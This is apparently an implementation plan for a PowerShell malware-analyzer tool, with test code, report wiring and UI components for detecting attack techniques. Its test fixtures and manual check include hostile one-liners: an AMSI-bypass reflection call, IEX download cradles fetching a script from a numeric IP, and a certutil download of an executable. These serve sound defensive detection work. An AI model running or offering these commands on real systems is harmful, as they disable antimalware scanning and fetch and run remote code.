Append to `shared/analyzer/__tests__/techniques.test.ts`:

```ts
describe('LOLBin surfaces through classify', () => {
  it('emits a lolbin signal naming the binary', () => {
    const s = analyze("certutil.exe -urlcache -split -f http://45.9.148.20/a.exe a.exe")
    const l = s.find((x) => x.id === 'lolbin')
    expect(l).toBeTruthy()
    expect(l!.label.toLowerCase()).toContain('certutil')
  })
})
```

- [ ] **Step 5: Run to verify pass**

Run: `npx vitest run ../shared/analyzer/__tests__/techniques.test.ts`
Expected: PASS (all blocks).

- [ ] **Step 6: Type gate + commit**

```bash
npx tsc -b
git add shared/analyzer/techniques.ts shared/analyzer/__tests__/techniques.test.ts
git commit -m "feat(analyzer): ClickFix, beaconing, reverse-shell, loader, persistence, LOLBin signatures"
```

---

### Task 5: Characterization + report wiring + copyText (`report.ts`)

**Files:**
- Modify: `shared/analyzer/report.ts`
- Test: `shared/analyzer/__tests__/characterization.test.ts` (new), `shared/analyzer/__tests__/report.test.ts` (append)

**Interfaces:**
- Consumes: `classify`, `buildContext` (Task 2); `Signal`, `Characterization` (types).
- Produces: `analyze()` now returns populated `signals` and `characterization`; `composeCopyText` includes a behaviour-signals section + the characterization line. Internal: `deriveCharacterization(signals: Signal[]): Characterization | null`.

- [ ] **Step 1: Write the failing characterization tests**

Create `shared/analyzer/__tests__/characterization.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { analyze } from '../report'

describe('specificity-gated characterization', () => {
  it('emits a high-confidence characterization when a near-dispositive signal fires', async () => {
    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    expect(r.characterization).not.toBeNull()
    expect(r.characterization!.level).toBe('high-confidence-malicious')
    expect(r.characterization!.basis).toContain('amsi-reflection')
    // read is built ONLY from near-dispositive signals in basis.
    expect(r.characterization!.read).toMatch(/AMSI bypass via reflection/)
  })

  it('read contains only names present in basis (no strong/weak signal leaks in)', async () => {
    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); Set-MpPreference -DisableRealtimeMonitoring $true")
    // Defender tamper is STRONG — its label must NOT appear in the read.
    expect(r.characterization!.read).not.toMatch(/Defender tampering/)
  })

  it('strong-only patterns yield NO characterization (anti-cry-wolf)', async () => {
    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    expect(r.signals.some((s) => s.id === 'download-cradle')).toBe(true)
    expect(r.characterization).toBeNull()
  })

  it('benign-twin (download to file) yields no signals and no characterization', async () => {
    const r = await analyze("Invoke-WebRequest https://example.com/data.json -OutFile data.json")
    expect(r.characterization).toBeNull()
    expect(r.signals.find((s) => s.id === 'download-cradle')).toBeUndefined()
  })
})
```

- [ ] **Step 2: Run to verify failure**

Run: `npx vitest run ../shared/analyzer/__tests__/characterization.test.ts`
Expected: FAIL — `signals` empty, `characterization` null (report not wired yet).

- [ ] **Step 3: Wire `report.ts`**

Edit `shared/analyzer/report.ts`:

Add imports near the top (after the existing `import { resolve, normalize } from './resolve'`):

```ts
import type { Characterization, Signal } from './types'
import { buildContext, classify } from './techniques'
```

Replace the block that computes `copyText` and returns the result. Find:

```ts
  const iocs = extractIocs(scan)

  const fullyDecoded = layers.filter((l) => l.state === 'fully-decoded').length
  const state = layers.length === 0 || fullyDecoded === layers.length ? 'fully-decoded' : 'partial'
  const fractionAccounted = layers.length === 0 ? 1 : fullyDecoded / layers.length
  const copyText = composeCopyText(layers, iocs)

  return {
    input,
    flags,
    layers,
    iocs,
    signals: [],
    characterization: null,
    bullets: [],
    confidence: { fractionAccounted, state },
    copyText,
    checkedAt: new Date().toISOString(),
  }
}
```

Replace with:

```ts
  const iocs = extractIocs(scan)

  // Signatures run over the decoded corpus: the outer (preprocessed) script plus
  // every resolved layer/recursion text, so a signal in an inner cradle counts.
  const corpus = [script, ...scan.map((s) => s.text)].filter(Boolean).join('\n')
  const signals = classify(buildContext(corpus, flags))
  const characterization = deriveCharacterization(signals)

  const fullyDecoded = layers.filter((l) => l.state === 'fully-decoded').length
  const state = layers.length === 0 || fullyDecoded === layers.length ? 'fully-decoded' : 'partial'
  const fractionAccounted = layers.length === 0 ? 1 : fullyDecoded / layers.length
  const copyText = composeCopyText(layers, iocs, signals, characterization)

  return {
    input,
    flags,
    layers,
    iocs,
    signals,
    characterization,
    bullets: [],
    confidence: { fractionAccounted, state },
    copyText,
    checkedAt: new Date().toISOString(),
  }
}

/** Specificity-gated: emit a characterization ONLY when at least one signal is
 *  near-dispositive (a technique with no legitimate use). The `read` and `basis`
 *  are built solely from those near-dispositive signals — the "malicious" word
 *  is earned by named techniques, never a black-box stamp. Weak/strong-only
 *  patterns (which benign RMM/installer/GPO tooling shares) return null. */
function deriveCharacterization(signals: Signal[]): Characterization | null {
  const nd = signals.filter((s) => s.specificity === 'near-dispositive')
  if (!nd.length) return null
  const read =
    'High-confidence malicious behaviour: ' +
    nd.map((s) => `${s.label} (no legitimate use)`).join(' + ')
  return { level: 'high-confidence-malicious', basis: nd.map((s) => s.id), read }
}
```

Update `composeCopyText` — replace its signature and body:

```ts
function composeCopyText(layers: DecodedLayer[], iocs: AnalysisResult['iocs']): string {
  const lines: string[] = ['PowerShell static analysis — STATIC analysis, script was NOT executed', '']
```

with:

```ts
function composeCopyText(
  layers: DecodedLayer[],
  iocs: AnalysisResult['iocs'],
  signals: Signal[],
  characterization: Characterization | null,
): string {
  const lines: string[] = ['PowerShell static analysis — STATIC analysis, script was NOT executed', '']
  if (characterization) lines.push(characterization.read, '')
  if (signals.length) {
    lines.push('Behaviour signals:')
    signals.forEach((s) => lines.push(`  [${s.specificity}] ${s.label} (${s.techniqueIds.join(', ')})`))
    lines.push('')
  }
```

(Leave the rest of `composeCopyText` — the layers/indicators sections — unchanged.)

- [ ] **Step 4: Run characterization tests**

Run: `npx vitest run ../shared/analyzer/__tests__/characterization.test.ts`
Expected: PASS.

- [ ] **Step 5: Add report copyText assertion**

Append to `shared/analyzer/__tests__/report.test.ts`:

```ts
describe('analyze — signals in copyText (Phase 3)', () => {
  it('lists behaviour signals and the characterization line in copyText', async () => {
    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    expect(r.copyText).toContain('High-confidence malicious behaviour')
    expect(r.copyText).toContain('Behaviour signals:')
    expect(r.copyText).toContain('download cradle')
  })

  it('a plain download cradle lists the signal but no characterization line', async () => {
    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    expect(r.copyText).toContain('download cradle')
    expect(r.copyText).not.toContain('High-confidence malicious behaviour')
  })
})
```

- [ ] **Step 6: Run the whole analyzer suite (nothing regressed)**

Run: `npx vitest run ../shared/analyzer`
Expected: PASS — all Phase 1/2a tests plus the new ones. The existing scaffold test (`signals: []`, `characterization: null` for empty input) still passes: empty input → empty corpus → no signals → null characterization.

- [ ] **Step 7: Type gate + commit**

```bash
npx tsc -b
git add shared/analyzer/report.ts shared/analyzer/__tests__/characterization.test.ts shared/analyzer/__tests__/report.test.ts
git commit -m "feat(analyzer): specificity-gated characterization + signals wired into report + copyText"
```

---

### Task 6: `'technique'` Chip variant (`Chip.tsx`)

**Files:**
- Modify: `shared/ui/Chip.tsx`

**Interfaces:**
- Consumes: nothing new.
- Produces: `'technique'` in `ChipVariant`, `VARIANT`, `DEFAULT_LABEL`. Periwinkle/neutral (accent tint) — reserved-colour compliant.

- [ ] **Step 1: Add the variant to the union**

In `shared/ui/Chip.tsx`, change:

```ts
export type ChipVariant =
  | 'neutral'
  | 'accent'
```

to add `'technique'` right after `'accent'`:

```ts
export type ChipVariant =
  | 'neutral'
  | 'accent'
  | 'technique'
```

- [ ] **Step 2: Add the `VARIANT` entry**

In the `VARIANT` map, after the `accent:` line add:

```ts
  // technique/LOLBin signal — periwinkle, NEVER a verdict hue (reserved-colour law)
  technique: 'border-[var(--edge-accent)] bg-[var(--tint-accent)] text-accent',
```

- [ ] **Step 3: Add the `DEFAULT_LABEL` entry**

In `DEFAULT_LABEL`, after the `accent: 'tag',` line add:

```ts
  technique: 'technique',
```

- [ ] **Step 4: Type gate**

Run (from `web/`): `npx tsc -b`
Expected: clean. (There is no runtime test harness for TSX in this repo — the vitest env is node/logic-only. The type gate is the automated check; visual verification happens in Task 7's dogfood.)

- [ ] **Step 5: Commit**

```bash
git add shared/ui/Chip.tsx
git commit -m "feat(ui): add periwinkle 'technique' Chip variant for analyzer signals"
```

---

### Task 7: `TechniqueTally` UI + wire into the route

**Files:**
- Create: `web/src/components/analyzer/TechniqueTally.tsx`
- Modify: `web/src/routes/PowerShellAnalyzer.tsx`

**Interfaces:**
- Consumes: `Signal`, `Characterization` (from `@socdesk/shared/analyzer`); `Chip`, `MicroLabel` (from `@socdesk/shared/ui`).
- Produces: `TechniqueTally({ signals, characterization })` React component; rendered between the evasion-flag chips and `DecodeLadder`.

- [ ] **Step 1: Create the component**

Create `web/src/components/analyzer/TechniqueTally.tsx`:

```tsx
import type { Characterization, Signal } from '@socdesk/shared/analyzer'
import { Chip, MicroLabel } from '@socdesk/shared/ui'

/** The technique-signal tally — the analyzer's headline. Renders a count line
 *  (or the near-dispositive-gated characterization when present), then one
 *  periwinkle chip per signal, each citing the substring that fired it. No
 *  synthesized score; red/amber/green never appear here (reserved-colour law). */
export function TechniqueTally({
  signals,
  characterization,
}: {
  signals: Signal[]
  characterization: Characterization | null
}) {
  if (!signals.length) return null
  const techniqueCount = new Set(signals.flatMap((s) => s.techniqueIds)).size

  return (
    <div className="flex flex-col gap-2">
      <MicroLabel tone="muted">Technique signals</MicroLabel>

      {characterization ? (
        <div className="rounded-md border border-[var(--edge-accent)] bg-[var(--tint-accent)] p-3">
          <span className="font-mono text-micro font-semibold uppercase tracking-label text-accent">
            High-confidence malicious behaviour
          </span>
          <p className="mt-1 text-xs font-semibold text-paper">{characterization.read}</p>
        </div>
      ) : (
        <p className="font-mono text-micro uppercase tracking-label text-faint">
          {signals.length} technique {signals.length === 1 ? 'signal' : 'signals'} across {techniqueCount} ATT&amp;CK{' '}
          {techniqueCount === 1 ? 'technique' : 'techniques'} — not a synthesized verdict
        </p>
      )}

      <ul className="flex flex-col gap-1.5">
        {signals.map((s) => (
          <li key={s.id} className="flex flex-wrap items-center gap-2">
            <Chip variant="technique">{s.label}</Chip>
            <span className="font-mono text-micro text-faint">{s.techniqueIds.join(' · ')}</span>
            {s.trigger && (
              <code className="min-w-0 truncate font-mono text-micro text-muted">{s.trigger}</code>
            )}
          </li>
        ))}
      </ul>
    </div>
  )
}
```

- [ ] **Step 2: Wire it into the route**

In `web/src/routes/PowerShellAnalyzer.tsx`, add the import (after the `IocTable` import):

```tsx
import { TechniqueTally } from '../components/analyzer/TechniqueTally'
```

Then inside the `state.kind === 'ok'` block, insert the tally between the flags block and `<DecodeLadder>`:

```tsx
          <TechniqueTally signals={state.result.signals} characterization={state.result.characterization} />
          <DecodeLadder layers={state.result.layers} />
```

- [ ] **Step 3: Type + build gate**

Run (from `web/`):

```bash
npx tsc -b && npm run build
```

Expected: both clean (build runs `tsc -b && vite build`).

- [ ] **Step 4: Dogfood — verify it renders (screenshot + clean console)**

Start the dev server (from `web/`): `npm run dev`. Open the `/analyzer` route. Paste:

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')
```

Confirm, with a screenshot and a clean browser console (per the project's verification discipline):
- the **High-confidence malicious behaviour** periwinkle callout renders, naming AMSI reflection;
- one periwinkle chip per signal (`AMSI bypass via reflection`, `download cradle`, …), each with its ATT&CK ids + trigger;
- **no red/amber/green** anywhere in the tally (reserved-colour law);
- the IOC `45.9.148.20`/URL still lands in the IOC table with a working "Look up →".

Then paste a benign twin (`Invoke-WebRequest https://example.com/data.json -OutFile data.json`) and confirm the tally is absent (no signals) — honest empty state.

- [ ] **Step 5: Commit**

```bash
git add web/src/components/analyzer/TechniqueTally.tsx web/src/routes/PowerShellAnalyzer.tsx
git commit -m "feat(analyzer): TechniqueTally UI with specificity-gated characterization headline"
```

---

## Self-Review

**1. Spec coverage (§6/§9/§12):**
- §6 rule table with `SignatureRule` shape + co-occurrence `upgradesWith` → Tasks 2–4 (engine + all listed families: download cradle, ClickFix, beaconing/C2, AMSI/ETW/Defender, evasion clustering, fileless loaders, persistence, LOLBins). ✅
- §6 tally rendering (count + specificity, each chip cites trigger, no bare score) → Task 7 `TechniqueTally`. ✅
- §6 specificity-gated characterization in `report.ts` (near-dispositive-only, enumerated + attributed, `'suspicious'` deferred) → Task 5 `deriveCharacterization`. ✅
- §9 `'technique'` Chip variant (one additive edit) + new presentational component + route wiring → Tasks 6–7. ✅ (`TallyHeadline`/`SegGauge` deliberately NOT reused — the tally is a fresh component, honoring §9.)
- §9 no canvas/PNG artifact in v1 → not added. ✅
- §12 tests: benign-twin per family, co-occurrence-upgrade test, near-dispositive→characterization, strong-only→null, benign-twin→null, `read ⊆ basis`, determinism → Tasks 2–5. ✅
- Reserved-colour law, public-sources-only, no-execution, zero-AI-attribution commits → Global Constraints + enforced per task. ✅

**2. Placeholder scan:** No "TBD"/"add error handling"/"similar to Task N" — every rule and component is fully coded. ✅

**3. Type consistency:** `RuleContext` defined in `types.ts` (Task 1), consumed by `lolbins.ts` and `techniques.ts`. `RuleHit`/`SignatureRule` defined in `techniques.ts` (Task 2). `classify`/`buildContext`/`runRules`/`RULES` exported from the barrel (Task 2 Step 4) and used by tests and `report.ts`. `deriveCharacterization` returns `Characterization | null` matching the existing `AnalysisResult.characterization` field. `composeCopyText`'s new 4-arg signature is updated at its one call site. `Signal`/`Characterization` types are the pre-existing ones in `types.ts` — unchanged. `'technique'` `ChipVariant` added consistently to union + `VARIANT` + `DEFAULT_LABEL`. ✅

**Deferred (out of scope, per spec §13):** action-bullet breakdown (`bullets.ts`, Phase 4), the honesty/`fractionAccounted` rework (`confidence.ts`, Phase 4), full `composeCopyText` polish (Phase 5), Phase 2b deobfuscation breadth. This plan is Phase 3 only.

---

## Execution Handoff

Plan complete and saved to `docs/superpowers/plans/2026-08-19-powershell-analyzer-phase3.md`. Two execution options:

**1. Subagent-Driven (recommended)** — a fresh subagent per task, review between tasks, fast iteration.

**2. Inline Execution** — execute tasks in this session with checkpoints.

⚠️ **Gate before starting:** Phase 3 is SAFEGUARD-SENSITIVE (the signature-catalog content trips the API cyber-safeguard). Per the handoff, confirm Carl's Cyber Verification is active — a signature-authoring probe should complete without a safeguard block — before executing Tasks 2–4.

Which approach?
